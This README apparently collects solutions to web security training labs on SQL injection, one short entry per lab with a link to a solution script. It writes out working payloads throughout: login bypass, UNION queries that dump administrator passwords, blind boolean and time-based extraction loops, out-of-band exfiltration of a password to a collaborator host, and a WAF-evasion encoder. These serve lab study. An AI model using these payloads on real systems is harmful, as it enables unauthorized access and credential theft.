<div align='center'>

# **SQL Injection**

</div>

## **Retrieving hidden data**

### **Lab 1:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Solution:** Set the category parameter to ` ` or 1=1 -- `. 

**Solution script:** [Lab1.py](./lab1.py)

## **Subverting application logic**

### **Lab 2:** SQL injection vulnerability allowing login bypass

**Solution:** In the login page, give `username = administrator' --`. 

**Solution script:** [Lab2.py](./lab2.py)

## **SQL injection UNION attacks**

### **Lab 3:** SQL injection UNION attack, determining the number of columns returned by the query

**Solution:** Set the category parameter to ` ' UNION Select null,null,null -- `. 

**Solution script:** [UNIONLab1.py](./UNIONLab1.py)

### **Lab 4:** SQL injection UNION attack, finding a column containing text

**Solution:** Set the category parameter to ` ' UNION Select null,null,'target string' -- `. 

**Solution script:** [UNIONLab2.py](./UNIONLab2.py). In the script, I have tried all possible combination of (null, null, target string) until the lab is solved.

### **Lab 5:** SQL injection UNION attack, retrieving data from other tables

**Solution:** Set the category parameter to ` ' UNION Select username,password from users where username = 'administrator' -- `. You will get the password of user 'administrator'. Finally, login as administrator to solve the lab. 

**Solution script:** [UNIONLab3.py](./UNIONLab3.py)

### **Lab 6:** SQL injection UNION attack, retrieving multiple values in a single column

**Solution:** Set the category parameter to ` ' UNION Select null, username || '~' || password from users where username = 'administrator' -- `. You will get the password of user 'administrator'. Finally, login as administrator to solve the lab. 

**Solution script:** [UNIONLab4.py](./UNIONLab4.py)

## **Examining the database**

### **Lab 7:** SQL injection attack, querying the database type and version on Oracle

**Solution:** Set the category parameter to ` ' UNION Select null,banner v$version where banner like 'Oracle%' -- `.

**Solution script:** [ExaminingLab1.py](./ExaminingLab1.py)

### **Lab 8:** SQL injection attack, querying the database type and version on MySQL and Microsoft

**Solution:** Set the category parameter to ` ' UNION Select @@version,null # `.

**Solution script:** [ExaminingLab2.py](./ExaminingLab2.py)

### **Lab 9:** SQL injection attack, listing the database contents on non-Oracle databases

**Solution:** Firstly, set the category parameter to ` ' UNION Select table_name,null from information_schema.tables where table_name like 'users_%'-- - ` to get the table name. Then, set the category parameter to ` ' UNION Select column_name,null from information_schema.columns where table_name = '(your table_name)' -- - ` to get all columns from that table. When you have the table with all columns, set the category parameter to ` ' UNION Select (your username columns),(your password column) from (your table_name) where (your username columns) = 'administrator' -- - ` to get the credential of the administrator.

**Solution script:** [ExaminingLab3.py](./ExaminingLab3.py)

### **Lab 10:** SQL injection attack, listing the database contents on Oracle

**Solution:** Firstly, set the category parameter to ` ' UNION Select table_name,null from all_tables where table_name like 'USERS_%'-- - ` to get the table name. Then, set the category parameter to ` ' UNION Select column_name,null from all_tab_columns where table_name = '(your table_name)' -- - ` to get all columns from that table. When you have the table with all columns, set the category parameter to ` ' UNION Select (your username columns),(your password column) from (your table_name) where (your username columns) = 'administrator' -- - ` to get the credential of the administrator.

**Solution script:** [ExaminingLab4.py](./ExaminingLab4.py)

## **Blind SQL Injection**

### **Lab 11:** Blind SQL injection with conditional responses

**Solution:** Modify the TrackingId cookie. Using brute force to get the length of the password by changing TrackingId to: 
```python
"Trackingid' AND (SELECT LENGTH(password) FROM users where username = 'administrator')='{}' -- -".format(password_len)
```
When password_len = 20, the message 'Welcome back' appear in the respond, so the length of the password is 20. Then, retrieve the password by changing TrackingId to:
```python
"Trackingid' AND (SELECT SUBSTR(password, {}, 1) FROM users where username = 'administrator')='{}' -- -".format(len(password) + 1, char)
```
char is chosen from the charset which contain lowercase letter and number. 

**Solution script:** [BlindLab1.py](./BlindLab1.py)

### **Lab 12:** Blind SQL injection with conditional errors

**Solution:** Similar to Lab 11, however, we rely on whether the query trigger an error or not. The query we use is:
```python
"Trackingid'||(SELECT case when (LENGTH(password)={}) then (1/0) else null end from users where username='administrator')||'".format(password_len)
```
```python
"Trackingid' ||(SELECT case when (SUBSTR(password,{},1)='{}') then (1/0) else null end from users where username='administrator')||'".format(len(password) + 1, char)
```

**Solution script:** [BlindLab2.py](./BlindLab2.py)

### **Lab 13:** Blind SQL injection with conditional errors

**Solution:** Change the trackingId of the cookies to `Trackingid || pg_sleep(10) -- -`.

 **Solution script:** [BlindLab3.py](./BlindLab3.py)

### **Lab 14:** Blind SQL injection with time delays and information retrieval

**Solution:** Similar to Lab 12, however, we rely on the time server take to respond . The query we use is:
```python
"Trackingid'||(SELECT case when (LENGTH(password)={}) then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'".format(password_len)
```
```python
"Trackingid' ||(SELECT case when (SUBSTR(password,{},1)='{}') then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'".format(len(password) + 1, char)
```

**Solution script:** [BlindLab4.py](./BlindLab4.py)

### **Lab 15:** Blind SQL injection with out-of-band interaction

**Solution:** Change the trackingId of the cookies to:
```python
'''Trackingid' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "{}"> %remote;]>'),'/l') FROM dual-- -'''.format(burp_client)
```
Then URLEncoded them.

**Solution script:** [BlindLab5.py](./BlindLab5.py)

### **Lab 16:** Blind SQL injection with out-of-band data exfiltration

**Solution:** Change the trackingId of the cookies to:
```python
'''Trackingid' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "'||(Select password from users where username = 'administrator')||'.{}"> %remote;]>'),'/l') FROM dual-- -'''.format(burp_client)
```
URLEncode them, then go to the Collaborator tab and get the password

**Solution script:** [BlindLab6.py](./BlindLab6.py)

## **SQL injection in different contexts**

### **Lab 17:** SQL injection with filter bypass via XML encoding

**Solution:** In the post request to endpoint /product/stock, use this xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>2 union select username || '~' || password from users where username = 'administrator'</storeId>
</stockCheck>
```
Then use html_encode to bypass the WAF
```python
def html_encode(string):
    return ''.join(['&#{0};'.format(ord(char)) for char in string])
```
You will get the password of the administrator user.

**Solution script:** [XMLLab.py](./XMLLab.py)